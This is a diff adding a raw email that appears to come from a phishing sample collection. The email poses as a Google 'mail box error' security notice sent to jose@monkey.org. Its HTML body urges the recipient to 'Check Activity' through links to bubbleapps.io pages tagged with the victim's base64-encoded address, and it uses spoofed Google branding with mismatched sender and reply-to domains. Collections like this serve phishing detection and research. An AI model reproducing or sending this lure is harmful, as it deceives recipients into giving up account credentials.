@@ -1,0 +1,190 @@
+From jose@monkey.org Tue Jul 25 15:26:04 2023 +0000
+Return-Path: bounce+0895f2.f208ef-jose=monkey.org@mg.cranium.id
+Delivered-To: jose@monkey.org
+X-FDA: 81050509848.39.45A1BF3
+Received: from m42-12.mailgun.net (m42-12.mailgun.net [69.72.42.12])
+	by imf30.b.hostedemail.com (Postfix) with ESMTP id D4A26180007
+	for <jose@monkey.org>; Tue, 25 Jul 2023 15:26:01 +0000 (UTC)
+Authentication-Results: imf30.b.hostedemail.com;
+	dkim=pass header.d=mg.cranium.id header.s=pic header.b=mS8s2CGX;
+	spf=pass (imf30.b.hostedemail.com: domain of "bounce+0895f2.f208ef-jose=monkey.org@mg.cranium.id" designates 69.72.42.12 as permitted sender) smtp.mailfrom="bounce+0895f2.f208ef-jose=monkey.org@mg.cranium.id";
+	dmarc=pass (policy=quarantine) header.from=cranium.id
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1690298761;
+	h=from:from:sender:sender:reply-to:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=pYuw8iQRvFQEcpchGXF55by27KrAsjMd6umwe36N/14=;
+	b=5+Dnfg6/tnDoNRMW0Pv+SZ1WKhNydYe3jlYm3ZGg5csdnpT27XfTANyLEcr2L4DysoCfyZ
+	gJKu/0V8RH5zfUQwNNkEkx+GjzHB86lEIh2FFyNjF36IKhEXK0khDvp7HkuyrF48+k2fj7
+	2PvVCBgJO72ZbIa9mNJooCKsJOOoSqs=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1690298761; a=rsa-sha256;
+	cv=none;
+	b=YPBuXMYuEL6qYCvr2aVJtRFZ9QoEOzaSiLIe1cYeYmbyo3JZE4jY6NuaPvgUUR58qgfYXQ
+	8dCPARECh0s8vRjRcgKA0BxTjzPWXnniK7RWioN0E/192oD+uZyVP2G2SUyOptDiHFHmJN
+	KnqIV0jdVaBc7R0btwODlAO26D9gx+c=
+ARC-Authentication-Results: i=1;
+	imf30.b.hostedemail.com;
+	dkim=pass header.d=mg.cranium.id header.s=pic header.b=mS8s2CGX;
+	spf=pass (imf30.b.hostedemail.com: domain of "bounce+0895f2.f208ef-jose=monkey.org@mg.cranium.id" designates 69.72.42.12 as permitted sender) smtp.mailfrom="bounce+0895f2.f208ef-jose=monkey.org@mg.cranium.id";
+	dmarc=pass (policy=quarantine) header.from=cranium.id
+DKIM-Signature: a=rsa-sha256; v=1; c=relaxed/relaxed; d=mg.cranium.id;
+ q=dns/txt; s=pic; t=1690298760; x=1690305960; h=Content-Transfer-Encoding:
+ Content-Type: MIME-Version: Message-ID: Date: Subject: Subject: To: To: From:
+ From: Reply-To: Sender: Sender;
+ bh=pYuw8iQRvFQEcpchGXF55by27KrAsjMd6umwe36N/14=;
+ b=mS8s2CGX+9y10Qf1KY8bRGyMMjmr35xXFCpEKCdA+PqLJz1K9Wil3N9q2DM8he+x070E+XlFTW8weE+yU5eo7NQCzwxee2t0EztyVCNIbf0Lbjz46BD2PQhgcQ4p9MP5bX8mOcza4Qpi0bEQuclBuyDruvMDeMIffFrTM/oYirwq+HEWn+HoHDKBGUlR9cVn5sgjInnwWO0im5zV7SwCOFR/lSG96splfbsN7eDRbXAeY2lVFebekelfkf94tXmPA5dS0ACURADCuwIYPIJjTQc0v9/o0ERd/uyq1cJpp3DVxXXqgipoguR5Qy1nm1kFe+Snu76bBWfT+7gp+2+Qbw==
+X-Mailgun-Sending-Ip: 69.72.42.12
+X-Mailgun-Sid: WyI0ZWMzOCIsImpvc2VAbW9ua2V5Lm9yZyIsImYyMDhlZiJd
+Received: from 107-172-75-155-host.colocrossing.com
+ (107-172-75-155-host.colocrossing.com [107.172.75.155]) by cb58e51241a9 with
+ SMTP id 64bfe988e4731f6a268e006a (version=TLS1.3,
+ cipher=TLS_AES_128_GCM_SHA256); Tue, 25 Jul 2023 15:26:00 GMT
+Sender: request-quote@mg.cranium.id
+Reply-To: ajit.rajendra@tuvindia.co.in
+From: Notice-monkey.org<request-quote@mg.cranium.id>
+To: jose@monkey.org
+Subject: Final Notification Mail Box Error
+Date: 25 Jul 2023 15:26:00 -0700
+Message-ID: <20230725152600.F89A968F4E49D1D4@mg.cranium.id>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam12
+X-Rspam-User: 
+X-Spam-Status: No, score=5.60
+X-Stat-Signature: 3t6c4hgchke5pk4zrj7p183u3zooi4fm
+X-Rspamd-Queue-Id: D4A26180007
+X-HE-Tag: 1690298761-320692
+X-HE-Meta: U2FsdGVkX19cAZBUr4AU8dBfBKNX38Z650daQ25redrOIe/BM43x25SMDMyeROwNcXJDsvIl7JKDercA4rY3TZQy1V+AHtCKPzCbzjZspIm8aDXcgGvVgv1/JtvelpzMfVN63EfkE6Z4tz3AYxyxIEBuDLWDi6LL9JWMH9aidG4gQz6MLM+48+E/3C1XB2ILSzI2qRKuIZcrw5f9HSR3dAF9fCoPQ877aO2y5P0h6EqY1UEzJ33BVIUqXO6jPl3JcmDJ7Rrv6pvR32kwSGhLo4UgKXiM8sPQomfS1TbBkiQRYMeulrITCBTFyTpRcVZaqf/XnNIqotC9i2DA3f08QFIlBMHuQtsJj4Q+7rkedqP10A/nkAy5qA==
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 212
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table style=3D"color: rgb(44, 45, 46); text-transform: none; text-indent: =
+0px; letter-spacing: normal; padding-top: 0px; padding-bottom: 0px; font-fa=
+mily: inherit; font-size: 15px; font-style: normal; font-weight: 400; word-=
+spacing: 0px; white-space: normal; border-collapse: collapse; max-width: 54=
+8px; border-spacing: 0px; orphans: 2; widows: 2; font-stretch: inherit; fon=
+t-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke=
+-width: 0px; text-decoration-style: initial;=20
+text-decoration-color: initial;" border=3D"0"><tbody><tr><td style=3D'margi=
+n: 0px; width: 181px; font-family: "Segoe UI", Frutiger, Arial, sans-serif;=
+ vertical-align: bottom;'>A new sign-in on Windows 10&nbsp;from 190.43***<b=
+r><br></td><td style=3D'margin: 0px; width: 186px; text-align: center; font=
+-family: "Segoe UI", Frutiger, Arial, sans-serif; vertical-align: bottom;'>=
+&nbsp;</td>
+<td style=3D'margin: 0px; width: 181px; text-align: right; font-family: "Se=
+goe UI", Frutiger, Arial, sans-serif; vertical-align: bottom;'>&nbsp;</td><=
+/tr><tr><td style=3D'margin: 0px; width: 181px; padding-top: 0px; padding-b=
+ottom: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size=
+: 14px; vertical-align: middle;'><span style=3D"border-width: 0px; margin: =
+0px; padding: 0px; color: black; vertical-align: baseline;">&nbsp;IP LOCATI=
+ON</span></td>
+<td style=3D'margin: 0px; width: 186px; text-align: center; padding-top: 0p=
+x; padding-bottom: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-seri=
+f; font-size: 14px; vertical-align: middle;'>&nbsp;</td><td style=3D'margin=
+: 0px; width: 181px; text-align: right; padding-top: 0px; padding-bottom: 0=
+px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; =
+vertical-align: middle;'>
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(192=
+, 0, 0); vertical-align: baseline;">&nbsp;<strong>United Kingdom</strong></=
+span></td></tr><tr><td style=3D"margin: 0px; padding: 0px;" colspan=3D"3"><=
+table style=3D"padding: 0px; border-collapse: collapse; border-spacing: 0px=
+;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td style=3D=
+"margin: 0px; padding: 0px; width: 180px; line-height: 10px; font-size: 6px=
+; min-height: 10px;" bgcolor=3D"#cccccc">&nbsp;</td>
+<td style=3D"margin: 0px; padding: 0px; width: 4px; line-height: 10px; font=
+-size: 6px; min-height: 10px;" bgcolor=3D"white">&nbsp;</td><td style=3D"ma=
+rgin: 0px; padding: 0px; width: 180px; line-height: 10px; font-size: 6px; m=
+in-height: 10px;" bgcolor=3D"#cccccc">&nbsp;</td><td style=3D"margin: 0px; =
+padding: 0px; width: 4px; line-height: 10px; font-size: 6px; min-height: 10=
+px;" bgcolor=3D"white">&nbsp;</td>
+<td style=3D"margin: 0px; padding: 0px; width: 180px; line-height: 10px; fo=
+nt-size: 6px; min-height: 10px;" bgcolor=3D"#c00000">&nbsp;</td></tr></tbod=
+y></table></td></tr><tr><td style=3D'margin: 0px; padding: 0px; width: 181p=
+x; line-height: 20px; font-family: "Segoe UI", Frutiger, Arial, sans-serif;=
+ font-size: 14px;'>&nbsp;</td><td style=3D'margin: 0px; padding: 0px; width=
+: 186px; text-align: center; line-height: 20px; font-family: "Segoe UI", Fr=
+utiger, Arial, sans-serif; font-size: 14px;'>&nbsp;</td>
+<td style=3D'margin: 0px; padding: 0px; width: 181px; text-align: right; li=
+ne-height: 20px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font=
+-size: 14px;'><strong><span style=3D"color: rgb(192, 0, 0);">&nbsp;</span><=
+/strong></td></tr></tbody></table>
+<strong style=3D'color: rgb(70, 87, 107); text-transform: none; text-indent=
+: 0px; letter-spacing: normal; font-family: Roboto, "Lucida Grande", Verdan=
+a, Arial, Helvetica, sans-serif; font-size: 12px; font-style: normal; word-=
+spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-variant-liga=
+tures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; t=
+ext-decoration-style: initial; text-decoration-color: initial;'></strong>
+<strong style=3D'color: rgb(70, 87, 107); text-transform: none; text-indent=
+: 0px; letter-spacing: normal; font-family: Roboto, "Lucida Grande", Verdan=
+a, Arial, Helvetica, sans-serif; font-size: 12px; font-style: normal; word-=
+spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-variant-liga=
+tures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; t=
+ext-decoration-style: initial; text-decoration-color: initial;'></strong>
+<strong style=3D'color: rgb(70, 87, 107); text-transform: none; text-indent=
+: 0px; letter-spacing: normal; font-family: Roboto, "Lucida Grande", Verdan=
+a, Arial, Helvetica, sans-serif; font-size: 12px; font-style: normal; word-=
+spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-variant-liga=
+tures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; t=
+ext-decoration-style: initial; text-decoration-color: initial;'></strong>
+<strong style=3D'color: rgb(70, 87, 107); text-transform: none; text-indent=
+: 0px; letter-spacing: normal; font-family: Roboto, "Lucida Grande", Verdan=
+a, Arial, Helvetica, sans-serif; font-size: 12px; font-style: normal; word-=
+spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-variant-liga=
+tures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; t=
+ext-decoration-style: initial; text-decoration-color: initial;'></strong>
+<table style=3D'color: rgb(70, 87, 107); text-transform: none; text-indent:=
+ 0px; letter-spacing: normal; font-family: Roboto, "Lucida Grande", Verdana=
+, Arial, Helvetica, sans-serif; font-size: 12px; font-style: normal; font-w=
+eight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
+ial;' dir=3D"ltr"><tbody><tr>
+<td id=3D"gmail-v1m_-6776783177184844783i1" style=3D'margin: 0px; padding: =
+0px; color: rgb(112, 112, 112); font-family: "Segoe UI Semibold", "Segoe UI=
+ Bold", "Segoe UI", "Helvetica Neue Medium", Arial, sans-serif; font-size: =
+17px;'><br>We detected Suspicious activities&nbsp;on your account jose@monk=
+ey.org</td></tr><tr>
+<td id=3D"gmail-v1m_-6776783177184844783i2" style=3D'margin: 0px; padding: =
+0px; color: rgb(38, 114, 236); font-family: "Segoe UI Light", "Segoe UI", "=
+Helvetica Neue Medium", Arial, sans-serif; font-size: 41px;'><font color=3D=
+"#0066cc" style=3D"font-size: 16pt;"><a style=3D"color: rgb(238, 43, 98);" =
+href=3D"https://barcodescan-63580.bubbleapps.io/version-test#YW05elpVQnRiMj=
+VyWlhrdWIzSm4=3D&amp;target=3D_blank" target=3D"_blank" rel=3D"noreferrer">=
+<strong>
+Check Activity / Action&nbsp;</strong>
+</a></font></td></tr><tr>
+<td id=3D"gmail-v1m_-6776783177184844783i4" style=3D'margin: 0px; padding: =
+25px 0px 0px; color: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verd=
+ana, Arial, sans-serif; font-size: 14px;'><br></td></tr><tr><td id=3D"gmail=
+-v1m_-6776783177184844783i4" style=3D'margin: 0px; padding: 25px 0px 0px; c=
+olor: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Arial, san=
+s-serif; font-size: 14px;'>Kindly ignore this email if your location is the=
+ same.<br>
+You received this email to let you know about important changes to your Acc=
+ount and services.</td></tr><tr><td id=3D"gmail-v1m_-6776783177184844783i8"=
+ style=3D'margin: 0px; padding: 25px 0px 0px; color: rgb(42, 42, 42); font-=
+family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'><=
+u><strong><span style=3D"color: rgb(0, 0, 255); font-size: xx-small;"><br><=
+/span></strong></u></td></tr><tr>
+<td style=3D'margin: 0px; padding: 25px 0px 0px; color: rgb(42, 42, 42); fo=
+nt-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;=
+'>Thanks,</td></tr><tr><td id=3D"gmail-v1m_-6776783177184844783i12" style=
+=3D'margin: 0px; padding: 0px; color: rgb(42, 42, 42); font-family: "Segoe =
+UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'>The Mail Box Set=
+ting<br>
+&copy; 2023 Google LLC,&nbsp;<a class=3D"m_2181460382802433193afal" style=
+=3D"text-align: center; color: rgba(0, 0, 0, 0.54); line-height: 18px; padd=
+ing-top: 12px; font-family: Roboto-Regular, Helvetica, Arial, sans-serif; f=
+ont-size: 11px;" href=3D"https://codescann.bubbleapps.io/version-test#YW05e=
+lpVQnRiMjVyWlhrdWIzSm4=3D&amp;target=3D_blank" rel=3D"noreferrer">1600 Amph=
+itheatre Parkway, Mountain View, CA 94043, USA</a></td></tr></tbody></table=
+></body></html>
